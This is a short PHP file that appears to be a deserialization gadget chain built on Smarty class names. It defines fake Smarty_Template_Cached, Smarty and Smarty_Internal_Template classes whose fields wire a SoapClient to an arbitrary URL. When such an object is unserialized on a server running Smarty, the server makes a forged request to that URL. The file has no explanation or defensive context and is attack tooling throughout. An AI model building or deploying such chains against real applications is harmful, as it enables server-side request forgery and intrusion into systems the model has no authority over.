<?php
class Smarty_Template_Cached
{
    public $is_locked = true;
    public function __construct($url)
    {
        $res = parse_url($url);
        $this->handler = new SoapClient(null, [
            'uri' => $res['scheme'] . '://' . $res['host'] . '/',
            'location' => $url
        ]);
    }
}

class Smarty 
{
    public $cache_locking = true;
}

class Smarty_Internal_Template
{
    public $cached;
    public $smarty;

    public function __construct($url)
    {
        $this->smarty = new Smarty();
        $this->cached = new Smarty_Template_Cached($url);
    }
}
?>
